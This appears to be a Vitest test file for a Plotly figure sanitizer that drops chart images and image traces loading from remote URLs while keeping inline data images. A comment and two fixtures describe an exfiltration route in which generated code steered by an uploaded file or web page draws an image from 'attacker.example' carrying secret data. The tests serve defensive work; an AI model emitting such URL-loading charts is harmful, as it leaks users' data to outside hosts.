import { describe, expect, it } from "vitest";
import { isChartArtifact, sanitizeFigure } from "./plotlyFigure";

describe("sanitizeFigure", () => {
  it("keeps the data and layout of an ordinary chart", () => {
    const figure = sanitizeFigure({ data: [{ type: "bar", y: [1, 2] }], layout: { title: { text: "Doanh thu" } } });

    expect(figure).toEqual({ data: [{ type: "bar", y: [1, 2] }], layout: { title: { text: "Doanh thu" } } });
  });

  // Generated code can be steered by an uploaded file or a web page; a chart
  // that loads an image from a URL would send data out the moment it draws.
  it("drops layout images that load from a URL but keeps inline ones", () => {
    const figure = sanitizeFigure({
      data: [],
      layout: {
        images: [
          { source: "https://attacker.example/p.png?d=secret", x: 0 },
          { source: "data:image/png;base64,AAAA", x: 1 },
        ],
      },
    });

    expect(figure!.layout.images).toEqual([{ source: "data:image/png;base64,AAAA", x: 1 }]);
  });

  it("drops image traces that load from a URL", () => {
    const figure = sanitizeFigure({
      data: [
        { type: "image", source: "http://attacker.example/i.png" },
        { type: "image", source: "data:image/png;base64,BBBB" },
        { type: "scatter", y: [1] },
      ],
    });

    expect(figure!.data).toEqual([
      { type: "image", source: "data:image/png;base64,BBBB" },
      { type: "scatter", y: [1] },
    ]);
  });

  it("refuses something that isn't a figure", () => {
    expect(sanitizeFigure(null)).toBeNull();
    expect(sanitizeFigure("chart")).toBeNull();
    expect(sanitizeFigure({ data: "nope" })).toBeNull();
  });
});

it("recognizes a chart artifact by its full name", () => {
  expect(isChartArtifact("s1/chart.plotly.json")).toBe(true);
  expect(isChartArtifact("s1/results.json")).toBe(false);
  expect(isChartArtifact("s1/plot.png")).toBe(false);
});
